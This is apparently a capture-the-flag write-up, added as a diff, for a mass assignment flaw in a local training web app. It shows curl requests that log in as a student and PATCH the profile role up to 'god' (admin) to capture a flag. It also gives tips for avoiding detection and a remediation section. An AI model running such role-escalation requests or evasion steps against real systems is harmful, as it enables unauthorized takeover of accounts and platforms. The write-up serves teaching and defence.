@@ -1,0 +1,134 @@
+# Breach 04 — Mass Assignment (Privilege Escalation)
+
+## Flag
+`FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`
+
+## Severity
+CRITICAL
+
+## CWE
+CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
+
+## OWASP
+A01:2021 – Broken Access Control
+
+## What it is
+Mass assignment is a vulnerability class where a server-side object is updated by
+passing a JSON/form payload whose keys map directly to object properties, without
+the server restricting which properties are allowed to be set. In this case,
+`PATCH /api/profile` accepts a JSON body and applies every key it finds directly
+to the authenticated user's database record — including `role`, a field that
+controls the user's privilege level on the entire platform.
+
+An HTML comment discovered during reconnaissance confirmed this design explicitly:
+<!-- PATCH /api/profile accepts role field - not documented but works -->
+And `/api/docs-internal` (readable by any authenticated user — see that breach)
+documents the exact role hierarchy:
+```json
+"role_values": ["visitor", "student", "cadet", "staff", "god"]
+```
+
+Because the server never checks whether the requesting user is *allowed* to change
+their own role, any authenticated student can escalate themselves to god (admin) in
+a single HTTP request — or step through the hierarchy one level at a time to avoid
+detection.
+
+## How it works
+
+### Step 1: Login as any student
+```bash
+curl -s -c /tmp/benjamin_cookies.txt \
+  -X POST http://localhost:4942/login \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'identity=benjamin@student.42.tech&password=hacked123'
+```
+
+### Step 2: Escalate to cadet
+```bash
+curl -s -X PATCH http://localhost:4942/api/profile \
+  -b /tmp/benjamin_cookies.txt \
+  -H "Content-Type: application/json" \
+  -d '{"role":"cadet"}'
+```
+
+### Step 3: Escalate to staff
+```bash
+curl -s -X PATCH http://localhost:4942/api/profile \
+  -b /tmp/benjamin_cookies.txt \
+  -H "Content-Type: application/json" \
+  -d '{"role":"staff"}'
+```
+
+### Step 4: Escalate to god (admin)
+```bash
+curl -s -X PATCH http://localhost:4942/api/profile \
+  -b /tmp/benjamin_cookies.txt \
+  -H "Content-Type: application/json" \
+  -d '{"role":"god"}'
+```
+Each PATCH returns the updated user record confirming the role change was applied.
+No authorization challenge at any step.
+
+### Step 5: Access the staff dashboard to retrieve the flag
+```bash
+curl -s -b /tmp/benjamin_cookies.txt http://localhost:4942/staff/dashboard \
+  | grep -oE 'FLAG\{[^}]+\}'
+```
+Result:
+
+FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
+
+
+The flag is displayed in a red alert banner on the staff dashboard:
+
+Cadet+ access granted — internal staff flag: FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
+
+
+## Flag Location
+- **Page:** `/staff/dashboard`
+- **Trigger:** Accessing the dashboard with cadet or higher role
+  (achieved via the PATCH escalation above)
+- **Location:** Alert banner at the top of the staff dashboard page
+
+## The Privilege Escalation Chain
+This breach is the **central link** in the mandatory privilege escalation chain
+the subject requires:
+
+student (starting role, any new account)
+└─ PATCH {"role":"cadet"} → cadet (unlocks /staff/dashboard + flag)
+└─ PATCH {"role":"staff"} → staff (unlocks staff-only UI)
+└─ PATCH {"role":"god"} → god (unlocks full admin)
+
+
+Each step in this chain is achieved by a single unauthenticated PATCH request —
+the server never verifies that the requesting user is permitted to make the change.
+
+## Impact
+- Any authenticated user — including a freshly registered throwaway account — can
+  escalate themselves to god (administrator) in under five seconds.
+- No trace is left in any user-facing audit log (none exist — see the Logging &
+  Monitoring Failures finding).
+- God-role access unlocks the full staff dashboard, all user records, and every
+  role-gated endpoint on the platform.
+- Combined with the JWT Forgery breach (which requires the signing secret leaked
+  via XXE), this is the alternative path to admin: one requires a prior exploit
+  chain to get the secret; this one requires only a valid session of any privilege
+  level.
+- An attacker who escalates to god and then changes their role back to student is
+  nearly undetectable — the role change is transient and leaves no footprint.
+
+## How it could have been avoided (remediation)
+- Maintain an explicit server-side allowlist of fields that `PATCH /api/profile`
+  is permitted to update: `first_name`, `last_name`, `campus`, `avatar` — and
+  silently ignore (or explicitly reject) every other key in the payload, including
+  `role`, `id`, `email`, and any internal field.
+- Role changes should be possible only through a separate, privileged endpoint
+  (e.g. `PATCH /api/admin/users/{id}/role`) that requires the requesting user to
+  already hold a sufficiently high role (staff or god), with every change written
+  to an immutable audit log.
+- Apply a schema-validation middleware layer at the framework level that rejects
+  any payload key not in the declared allowlist before the handler ever sees the
+  data — this prevents the same class of bug from appearing on other endpoints.
+- Treat `/api/docs-internal` as a staff-only resource (see that breach's
+  remediation) so that the role hierarchy and writable field names are not
+  discoverable by a student-role attacker in the first place.
